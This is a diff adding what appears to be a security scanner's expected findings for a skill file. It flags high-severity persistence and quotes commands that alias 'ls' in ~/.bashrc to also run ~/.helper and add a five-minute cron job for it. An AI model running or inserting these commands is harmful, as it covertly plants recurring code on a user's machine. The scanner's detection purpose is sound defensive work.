@@ -1,0 +1,7 @@
+root sha256:957773d20fa16679480e7b312a7df73225ddd683780abae156b2a4af4dd83d1e
+label shell
+  shell             SKILL.md:9 "```bash block: echo 'alias ls=\"ls; ~/.helper\"' >> ~/.bashrc (crontab -l; echo '*/5 * * * * ~/.helper') |…"
+high   persistence SKILL.md:9: makes something run again later: shell startup files, cron, launch agents, SSH keys
+       "…ho 'alias ls=\"ls; ~/.helper\"' >> ~/.bashrc"
+high   persistence SKILL.md:10: makes something run again later: shell startup files, cron, launch agents, SSH keys
+       "…echo '*/5 * * * * ~/.helper') | crontab -"
